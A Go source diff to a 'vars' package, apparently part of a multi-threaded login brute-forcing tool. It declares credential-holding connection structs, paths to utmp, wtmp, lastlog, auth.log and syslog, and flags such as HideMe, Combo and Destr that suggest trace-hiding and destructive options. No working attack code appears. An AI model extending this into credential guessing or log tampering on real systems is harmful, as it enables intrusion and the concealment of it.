@@ -1,5 +1,7 @@
 package vars
 
+import "sync"
+
 const (
 	Empty        = 0x0
 	RunLevel     = 0x1
@@ -92,6 +94,24 @@ type Utmp struct {
 	Reserved [20]byte
 }
 
+type Connection struct {
+	Host     string
+	Port     string
+	Username string
+	Password string
+	IsUsed   bool
+}
+
+type AllConnections struct {
+	Mu   sync.Mutex
+	Conn []Connection
+}
+
+type DelaConnection struct {
+	Single bool
+	Conn   Connection
+}
+
 // //////////UTMP///////////
 var UTMP_FILE = "/var/run/utmp"
 var UTMP_SIZE = 384
@@ -102,3 +122,24 @@ const LASTLOG_FILE = "/var/log/lastlog"
 
 // //////////AUTH_LOG ///////////
 var AUTH_LOG string = "/var/log/auth.log"
+
+var WTMP string = "/var/log/wtmp"
+
+// var AUTH_LOG string = "/var/log/auth.log"
+var SYSLOG string = "/var/log/syslog"
+
+///////////////////////////////////////
+
+var (
+	BrFile        string
+	BrFileHomeDir string
+	Host          string
+	Port          string
+	User          string
+	Pass          string
+	ConnectedUser string
+	Threads       int
+	HideMe        bool
+	Combo         bool
+	Destr         bool
+)
